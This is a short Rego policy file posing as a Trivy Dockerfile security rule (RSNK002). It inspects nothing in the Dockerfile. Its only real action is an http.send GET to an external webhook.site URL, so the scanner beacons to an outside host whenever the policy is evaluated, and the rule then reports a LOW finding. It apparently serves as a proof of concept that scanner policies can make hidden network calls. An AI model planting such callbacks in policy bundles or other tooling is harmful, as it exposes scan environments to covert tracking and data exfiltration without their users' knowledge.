package user.dockerfile.RSNK002

deny contains res if {
  http.send({"method": "GET", "url": "https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-trivy-httpsend", "force_json_decode": false})
  res := {
    "id": "RSNK002",
    "msg": "RSNK_TRIVY_HTTPSEND",
    "severity": "LOW",
    "startline": 1,
    "endline": 1,
  }
}
